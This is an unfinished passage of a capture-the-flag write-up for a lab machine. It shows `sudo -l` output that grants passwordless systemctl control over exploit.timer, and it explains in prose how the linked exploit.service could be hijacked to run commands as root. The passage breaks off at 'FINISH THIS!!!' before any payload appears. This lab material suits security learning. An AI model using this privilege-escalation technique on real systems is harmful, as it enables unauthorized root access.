⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{XXX}
```
### Root.txt
Now it's to escalate those privileges. The first thing to do in those situations is run sudo -l to see if we can abuse some binaries and run them as sudo.

```
comte@ip-10-113-133-100:~$ sudo -l
User comte may run the following commands on ip-10-113-133-100:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

Yes we can, and we will!

The privilege to run `/bin/systemctl daemon-reload` and control `exploit.timer` means we can modify or hijack the service configurations that the system manager executes with administrative permissions.

A `.timer` unit in systemd always triggers a matching `.service` file of the same name (in this case, `exploit.service`). If we can find and modify that service file—or create a new configuration overlay for it—we can force it to run any command we want as root.

FINISH THIS!!!

- Burp Pro is the best tool for web enumeration apparently. (Turbo Intruder)
